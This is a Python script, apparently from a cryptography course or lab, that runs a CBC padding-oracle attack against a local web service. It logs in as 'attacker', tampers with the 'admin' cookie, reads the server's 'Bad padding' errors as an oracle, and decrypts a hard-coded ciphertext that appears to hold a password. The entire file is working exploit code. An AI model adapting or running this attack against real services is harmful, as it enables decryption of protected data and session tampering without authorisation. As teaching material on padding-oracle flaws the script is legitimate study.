import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.backends import default_backend
from maul import do_login_form

import base64
import binascii

from requests import codes, Session, cookies

class PaddingOracle(object):
    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(algorithms.AES.block_size / 8)

    @property
    def block_length(self):
        return self._block_size_bytes

    def test_ciphertext(self, sess, ct):
        response = sess.post(self.url, {}, cookies={'admin': ct}).text
        if 'Unspecified error' in response:
            return -1
        elif 'Bad padding' in response:
            return 0
        else:
            return 1

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx, sess):
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))
    msg = ''
    decoded = [0] * po.block_length

    for j in range(1, 17):
        i = po.block_length - j

        for n in range(0, 256):
            bytes_array = bytearray(c0[:i])
            bytes_array.append(n ^ c0[i])
            bytes_array.extend([j ^ v for v in decoded[i+1:]])

            mauled = bytes(bytes_array)
            ct = (b'\x00' * 16 + mauled + c1).hex() if i == 0 else (mauled + c1).hex() 
            
            if po.test_ciphertext(sess, ct) == 1:
                    decoded[i] = n ^ c0[i] ^ j

    msg = ''.join([chr(v1 ^ v2) for v1, v2 in zip(c0, decoded)])
    return msg

def po_attack(po, ctx):
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)

    sess = Session()
    assert(do_login_form(sess, "attacker", "attacker"))

    decoded = ''
    for i in range(nblocks-1):
        decoded += po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1], sess)

    return decoded

if __name__ == '__main__':
    po = PaddingOracle("http://localhost:8080/setcoins")
    pwd = po_attack(
        po,
        bytes.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
    )

    print(pwd)
